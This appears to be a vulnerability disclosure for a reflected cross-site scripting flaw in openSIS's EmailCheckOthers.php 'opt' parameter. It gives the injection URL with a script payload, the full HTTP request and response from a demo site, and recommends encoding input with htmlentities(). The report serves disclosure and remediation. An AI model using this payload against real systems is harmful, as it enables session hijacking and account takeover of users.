| Description By injecting Javascript code, an attacker can steal the user's cookie and take over the user's account. This happened because of the lack of security implementation for`type` parameter. This was tested on demo website Exploitation [Screenshot from 2021-09-05 14-06-22](https://user-images.githubusercontent.com/35491855/132122706-da7fec3a-2b7b-433b-b059-a25f7cf604ae.jpg)  **Injection point:** `HTTP://demo/EmailCheckOthers.php?opt=<script>alert(1)</script>&email=asfasf` **Request:**  ``` GET /EmailCheckOthers.php?opt=%3Cscript%3Ealert(1)%3C/script%3E&email=asfasf HTTP/1.1 Host: demo.opensis.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: PHPSESSID=iadm2hjbvs4vqmskk07vcpp8n5; miniSidebar=0 Upgrade-Insecure-Requests: 1  ```  **Response:**  ``` HTTP/1.1 200 OK Date: Sun, 05 Sep 2021 09:57:28 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.29 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Content-Length: 6 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/html  ``` Solution: Before using any user's input, make sure to verify and sanitize it properly, trust nothing that's sent from the client. In the case of XSS, please consider using `htmlentities()` function to encode the user's input before printing it out to the user's screen |
